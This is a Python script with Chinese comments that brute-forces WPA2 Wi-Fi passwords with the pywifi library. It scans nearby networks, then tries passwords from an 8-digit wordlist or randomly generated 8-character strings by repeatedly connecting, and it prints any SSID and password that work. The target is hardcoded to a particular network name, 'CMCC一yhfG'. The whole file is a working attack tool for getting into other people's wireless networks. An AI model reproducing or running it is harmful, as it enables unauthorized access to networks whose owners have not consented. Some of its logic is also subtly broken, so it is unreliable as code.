import pywifi
import time
from pywifi import const 
import comtypes
from random import choice

def getwifi(wifilist,wificount):
    wifi = pywifi.PyWiFi() # 抓取网卡接口
    ifaces = wifi.interfaces()[0] # 获取网卡
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()
    allwifilist = []
    namelist = []
    ssidlist = []
    for data in bessis:
        if data.ssid not in namelist: #去掉重命名的wifi名称
            namelist.append(data.ssid)
            allwifilist.append((data.ssid,data.signal))
            sorted(allwifilist,key=lambda st:st[1],reverse=True)
            time.sleep(1)
            n = 0
            if len(allwifilist) is not 0:
                for item in allwifilist:
                    if(item[0] not in ssidlist) & (item[0] not in wifilist):
                        n+=1
                        if n <= wificount:
                            ssidlist.append(item[0])
                            print(allwifilist)

    return ssidlist

def getifaces():
    wifi = pywifi.PyWiFi() # 抓取网卡接口
    ifaces = wifi.interfaces()[0] # 获取网卡
    ifaces.disconnect() # 断开无线网卡连接
    return ifaces

def testwifi(ifaces,ssidname,password):
    profile = pywifi.Profile() # 创建wifi连接文件
    profile.ssid = ssidname # 定义wifissid
    profile.auth = const.AUTH_ALG_OPEN #网卡开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP #加密单元
    profile.key =  password #wifi密码
    ifaces.remove_all_network_profiles()#删除其他所有配置文件
    tmp_profile = ifaces.add_network_profile(profile)#加载配置文件
    ifaces.connect(tmp_profile) #连接wifi
    time.sleep(3) # 5秒能否连接上
    if ifaces.status() == const.IFACE_CONNECTED:
        print("id=" + ssidname+"  pwd=" + password)
        return True
    else:
        return False

def beginwork(wifinamelist):
    ifaces = getifaces()
    path = r'password-8位数字.txt' # wifi密码文件
    files = open(path,'r')
    while True:
        try:
            password = files.readline()
            password = password.strip(' \n')
            if not password:
                break
            for wifiname in wifinamelist:
                print("正在尝试"+wifiname+','+password)
                if testwifi(ifaces,wifiname,password):
                    wifinamelist.remove(wifiname)
                    break
                if not wifinamelist:
                    break
        except  Exception as e:
            print(e)
            continue
        files.close()

        #判断new的值是否在old之中
def judge_repeat(new, old):
    passwd_lib = 'abcdefghijklmnopqrstuvwxyz*'
    while True:
        new = choice(passwd_lib)
        cnt = 0
        for c in old:
            if c == new:
                cnt += 1
        if cnt <= 2:
            old += new
            return old
            break

def gen_pwd(lenth = 8):
    tmp_pwd = ''
    password = ''
    for i in range(lenth):
        password = judge_repeat(tmp_pwd, password)
    return password

def crack(wifinamelist):
    ifaces = getifaces()
    i = 0
    while True:
        try:
            i = i + 1
            password = gen_pwd(8)
           # password = 'h*hwksna'
            if not password:
                break
            for wifiname in wifinamelist:
                print("第"+ str(i) + "次尝试->"+wifiname+','+password)
                if testwifi(ifaces,wifiname,password):
                    wifinamelist.remove(wifiname)
                    break
                if not wifinamelist:
                    break
        except  Exception as e:
            print(e)
            continue


if __name__ == '__main__':
    #wifiname_e = ['Honor 9'] #排除不破解的wifi的名字, 'CMCCâ\x80\x94yhfG', 'ChinaNet-ehSP'
    #wifinames = getwifi(wifiname_e,5)
    wifinames = ['CMCC一yhfG']
    #wifinames = ['CMCC-QwYf']
    print(wifinames)
    #beginwork(wifinames)

    crack(wifinames)

